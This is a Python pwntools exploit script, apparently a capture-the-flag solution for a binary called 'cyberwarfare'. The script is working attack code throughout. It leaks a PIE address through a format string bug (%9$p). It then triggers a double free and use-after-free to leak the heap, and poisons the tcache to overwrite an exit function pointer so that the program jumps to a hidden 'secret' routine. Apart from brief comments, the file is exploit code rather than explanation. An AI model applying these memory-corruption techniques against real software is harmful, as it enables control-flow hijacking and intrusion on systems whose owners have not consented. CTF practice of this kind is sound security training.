#!/usr/bin/env python2

from pwn import *

HOST, PORT = 'exploit-4', 4400

elf = ELF('./cyberwarfare')
libc = ELF('./libc.so.6')

context.arch = 'amd64'

def start():
	if not args.REMOTE:
		print "LOCAL PROCESS"
		return process('./cyberwarfare')
	else:
		print "REMOTE PROCESS"
		return remote(HOST, PORT)

def get_base_address(proc):
	return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(p)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    gdb.attach(p,gdbscript=script)

def add_missile(idx, name, desc):
    p.sendlineafter('>>> \n', '0')
    p.sendlineafter('ID: \n', str(idx))
    p.sendlineafter('name: \n', str(name))
    p.sendlineafter('description: \n', str(desc))

def load_missile(idx):
    p.sendlineafter('>>> \n', '1')
    p.sendlineafter('load: \n', str(idx))

def unload_missile():
    p.sendlineafter('>>> \n', '2')

def launch_missile():
    p.sendlineafter('>>> \n', '3')

def print_specs():
    p.sendlineafter('>>> \n', '4')

context.terminal = ['tmux', 'new-window']
p = start()

if args.GDB:
    debug([])

# Use the format string vulnerability to get PIE leaks
add_missile(0, '%9$p', 'A')
p.recvuntil('Name \'')
PIE_leak = int(p.recvuntil('\'')[:-1], 16)
PIE_base = PIE_leak - 0xff2
secret = PIE_base + 0xccf

log.info('PIE leak: ' + hex(PIE_leak))
log.info('PIE_base: ' + hex(PIE_base))
log.info('secret: ' + hex(secret))

# Next, add a missile to prepare for the double free
add_missile(1, 'A'*31, 'A'*15)

# Double free
load_missile(1)
launch_missile()
launch_missile()

# Use the use-after-free to leak a heap address now
print_specs()

p.recvuntil("Name: ")
p.recvline().strip()
heap = u64(p.recvline().strip().ljust(8, '\x00'))
heap_base = heap - 0x18e0
option_5_func = heap_base + 0x3c8 # Function pointer of the exit function is here

log.info("Heap leak: " + hex(heap))
log.info("Heap base: " + hex(heap_base))
log.info("Option 5 pointer: " + hex(option_5_func))

add_missile(0, '\x00', p64(option_5_func)) # Overwrite tcache bin ptr with option 5

# Tcache bin: double freed missile <- option_5_func

add_missile(0, 'A', '\x00')
add_missile(2, 'A', p64(secret)) # Overwrite option 5 function ptr with secret

# Now attempting to exit prints the flag
p.sendlineafter('>>> \n', '5') 

p.interactive()
